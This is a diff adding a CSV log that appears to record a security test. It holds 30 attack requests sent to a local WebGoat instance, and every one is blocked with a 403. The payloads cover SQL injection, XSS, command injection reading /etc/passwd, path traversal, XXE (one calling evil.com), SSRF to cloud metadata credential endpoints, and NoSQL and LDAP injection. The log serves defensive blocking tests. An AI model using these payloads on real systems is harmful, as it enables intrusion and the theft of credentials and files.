@@ -1,0 +1,31 @@
+timestamp,iteration,ip,method,url,path,protocol,request_body,response_status,blocked,latency_ms
+2025-12-07T23:59:27.264490,1,127.0.0.1,POST,http://localhost:2323/WebGoat/SqlInjection/attack8,/WebGoat/SqlInjection/attack8,HTTP/1.1,' OR 1=1-- ,403,True,5181.58
+2025-12-07T23:59:29.371873,1,127.0.0.1,POST,http://localhost:2323/WebGoat/SqlInjection/attack8,/WebGoat/SqlInjection/attack8,HTTP/1.1,"' UNION SELECT NULL, @@version, NULL-- ",403,True,1900.88
+2025-12-07T23:59:31.382856,1,127.0.0.1,POST,http://localhost:2323/WebGoat/SqlInjection/attack8,/WebGoat/SqlInjection/attack8,HTTP/1.1,' AND SLEEP(5)-- ,403,True,1807.31
+2025-12-07T23:59:33.536081,1,127.0.0.1,POST,http://localhost:2323/WebGoat/SqlInjection/attack8,/WebGoat/SqlInjection/attack8,HTTP/1.1,<script>alert('XSS')</script>,403,True,1942.65
+2025-12-07T23:59:35.913849,1,127.0.0.1,POST,http://localhost:2323/WebGoat/SqlInjection/attack8,/WebGoat/SqlInjection/attack8,HTTP/1.1,<img src=x onerror=alert('XSS')>,403,True,2175.68
+2025-12-07T23:59:38.014855,1,127.0.0.1,POST,http://localhost:2323/WebGoat/SqlInjection/attack8,/WebGoat/SqlInjection/attack8,HTTP/1.1,; ls -la /,403,True,1889.85
+2025-12-07T23:59:40.015228,1,127.0.0.1,POST,http://localhost:2323/WebGoat/SqlInjection/attack8,/WebGoat/SqlInjection/attack8,HTTP/1.1,&& cat /etc/passwd,403,True,1795.25
+2025-12-07T23:59:41.974884,1,127.0.0.1,POST,http://localhost:2323/WebGoat/SqlInjection/attack8,/WebGoat/SqlInjection/attack8,HTTP/1.1,& dir C:\,403,True,1750.36
+2025-12-07T23:59:44.006144,1,127.0.0.1,POST,http://localhost:2323/WebGoat/SqlInjection/attack8,/WebGoat/SqlInjection/attack8,HTTP/1.1,../../../etc/passwd,403,True,1827.51
+2025-12-07T23:59:46.010615,1,127.0.0.1,POST,http://localhost:2323/WebGoat/SqlInjection/attack8,/WebGoat/SqlInjection/attack8,HTTP/1.1,..\..\..\windows\win.ini,403,True,1801.35
+2025-12-07T23:59:48.480984,1,127.0.0.1,POST,http://localhost:2323/WebGoat/SqlInjection/attack8,/WebGoat/SqlInjection/attack8,HTTP/1.1,"<!DOCTYPE foo [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]> &xxe;",403,True,2267.79
+2025-12-07T23:59:50.657155,1,127.0.0.1,POST,http://localhost:2323/WebGoat/SqlInjection/attack8,/WebGoat/SqlInjection/attack8,HTTP/1.1,http://localhost/admin,403,True,1973.09
+2025-12-07T23:59:52.917952,1,127.0.0.1,POST,http://localhost:2323/WebGoat/SqlInjection/attack8,/WebGoat/SqlInjection/attack8,HTTP/1.1,http://169.254.169.254/latest/meta-data/iam/security-credentials/,403,True,2049.25
+2025-12-07T23:59:54.954936,1,127.0.0.1,POST,http://localhost:2323/WebGoat/SqlInjection/attack8,/WebGoat/SqlInjection/attack8,HTTP/1.1,"{""$gt"": """"}",403,True,1829.66
+2025-12-07T23:59:57.042108,1,127.0.0.1,POST,http://localhost:2323/WebGoat/SqlInjection/attack8,/WebGoat/SqlInjection/attack8,HTTP/1.1,*)(uid=*)),403,True,1874.41
+2025-12-08T00:00:12.685216,2,127.0.0.1,POST,http://localhost:2323/WebGoat/SqlInjection/attack8,/WebGoat/SqlInjection/attack8,HTTP/1.1,' OR '1'='1' -- -,403,True,2607.64
+2025-12-08T00:00:14.725951,2,127.0.0.1,POST,http://localhost:2323/WebGoat/SqlInjection/attack8,/WebGoat/SqlInjection/attack8,HTTP/1.1,"' UNION ALL SELECT null, database(), user(), null /*",403,True,1825.28
+2025-12-08T00:00:16.784944,2,127.0.0.1,POST,http://localhost:2323/WebGoat/SqlInjection/attack8,/WebGoat/SqlInjection/attack8,HTTP/1.1,' WAITFOR DELAY '0:0:5'; --,403,True,1845.65
+2025-12-08T00:00:19.087234,2,127.0.0.1,POST,http://localhost:2323/WebGoat/SqlInjection/attack8,/WebGoat/SqlInjection/attack8,HTTP/1.1,"<img src=""x"" onerror=""&#x61;&#x6c;&#x65;&#x72;&#x74;('XSS')"">",403,True,2100.23
+2025-12-08T00:00:21.138681,2,127.0.0.1,POST,http://localhost:2323/WebGoat/SqlInjection/attack8,/WebGoat/SqlInjection/attack8,HTTP/1.1,<svg/onload=prompt('XSS')>,403,True,1849.55
+2025-12-08T00:00:23.127607,2,127.0.0.1,POST,http://localhost:2323/WebGoat/SqlInjection/attack8,/WebGoat/SqlInjection/attack8,HTTP/1.1,| cat /etc/passwd |,403,True,1781.95
+2025-12-08T00:00:25.078037,2,127.0.0.1,POST,http://localhost:2323/WebGoat/SqlInjection/attack8,/WebGoat/SqlInjection/attack8,HTTP/1.1,"& powershell -command ""ipconfig /all""",403,True,1749.16
+2025-12-08T00:00:27.148948,2,127.0.0.1,POST,http://localhost:2323/WebGoat/SqlInjection/attack8,/WebGoat/SqlInjection/attack8,HTTP/1.1,..%252f..%252f..%252fetc%252fshadow,403,True,1862.6
+2025-12-08T00:00:29.269528,2,127.0.0.1,POST,http://localhost:2323/WebGoat/SqlInjection/attack8,/WebGoat/SqlInjection/attack8,HTTP/1.1,../../../../../../../boot.ini,403,True,1915.5
+2025-12-08T00:00:31.665188,2,127.0.0.1,POST,http://localhost:2323/WebGoat/SqlInjection/attack8,/WebGoat/SqlInjection/attack8,HTTP/1.1,"<!DOCTYPE doc SYSTEM ""http://evil.com/xxe.dtd"">",403,True,2187.61
+2025-12-08T00:00:33.699912,2,127.0.0.1,POST,http://localhost:2323/WebGoat/SqlInjection/attack8,/WebGoat/SqlInjection/attack8,HTTP/1.1,http://%31%32%37%2E%30%2E%30%2E%31/admin,403,True,1830.34
+2025-12-08T00:00:35.759475,2,127.0.0.1,POST,http://localhost:2323/WebGoat/SqlInjection/attack8,/WebGoat/SqlInjection/attack8,HTTP/1.1,http://metadata.google.internal/computeMetadata/v1/instance/attributes/?recursive=true,403,True,1853.48
+2025-12-08T00:00:37.888190,2,127.0.0.1,POST,http://localhost:2323/WebGoat/SqlInjection/attack8,/WebGoat/SqlInjection/attack8,HTTP/1.1,"{""$regex"": "".*"", ""$options"": ""i""}",403,True,1920.87
+2025-12-08T00:00:39.856259,2,127.0.0.1,POST,http://localhost:2323/WebGoat/SqlInjection/attack8,/WebGoat/SqlInjection/attack8,HTTP/1.1,*)(objectClass=person)),403,True,1757.77
+2025-12-08T00:00:41.786790,2,127.0.0.1,POST,http://localhost:2323/WebGoat/SqlInjection/attack8,/WebGoat/SqlInjection/attack8,HTTP/1.1,`cat /etc/hosts`,403,True,1719.68
